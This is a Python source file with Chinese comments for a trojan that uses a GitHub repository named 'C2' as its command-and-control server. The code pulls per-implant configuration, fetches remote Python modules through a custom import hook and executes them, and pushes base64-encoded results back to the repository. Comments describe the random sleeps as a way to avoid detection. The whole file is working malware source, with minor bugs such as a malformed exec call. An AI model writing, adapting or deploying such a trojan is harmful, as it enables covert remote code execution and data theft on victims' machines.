# -*- coding:utf-8 -*-
"""
作者：shinian
创建日期：2024/5/17 21:08
"""
import base64
import importlib
import json
import random
import sys
import threading
import time
from datetime import datetime

import github3


# 读取token，连接到github，创建一个session连接
def github_connect():
    with open('mytoken.txt') as fp:
        token = fp.read()
    user = 'shinianyunyan'  # 用户名
    sess = github3.login(token=token)  # 给不同的木马创建不同的session，以防被捕捉后拿到全部数据
    return sess.repository(user=user, repository='C2')


# 获取文件路径等内容，以便读取配置文件和模块源码
def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content


class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'  # 配置文件信息
        self.data_path = f'data/{id}/'  # 数据目录
        self.repo = github_connect()  # 连接到github，创建的一个github仓库对象

    # 从仓库中读取远程配置文件
    def get_config(self):
        config_json = get_file_contents(
            # 读取对应id的配置文件
            'config', self.config_file, self.repo
        )
        config = json.loads(base64.b64decode(config_json))  # 解码获取的配置信息
        # print(config)

        # 检查指定的模块是否已经在当前环境中导入
        for task in config:
            if task['module'] not in sys.modules:
                # 将模块内容引入木马对象
                exec("import %s task['module']")
        return config

    def module_runner(self, module):
        result = sys.modules[module].run()  # 执行模块中的代码
        self.store_module_result(result)

    # 创建一个名为当前时间的文件，并将模块输出结果保存到文件中
    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'  # e.g.:data/<id>/20241320.data
        bindata = bytes('%r' % data, 'utf-8')  # 指定编码及转码
        self.repo.create_file(
            # 使用库对象创建一个文件，路径为 remote_path，提交的日期等信息 message，经base64加密的内容 bindata
            remote_path, message, base64.b64encode(bindata)
        )

    def run(self):
        while True:
            config = self.get_config()  # 去github仓库中拉取配置文件
            for task in config:
                # 每一个模块都对应一个线程去执行
                thread = threading.Thread(
                    target=self.module_runner,
                    args=(task['module'],)
                )
                thread.start()
                time.sleep(random.randint(1, 10))  # 随机睡眠1-9秒，防止被发现

            time.sleep(random.randint(30 * 60, 3 * 60 * 60))  # 随机休眠180s-1800s，防止被发现

class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):
        print(f"[*] Attempting to retrieve {name}")
        self.repo = github_connect()

        new_library = get_file_contents('modules', f'{name}.py', self.repo)
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)
            return self

    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.get_url)
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        return new_module

if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('abc')
    trojan.run()

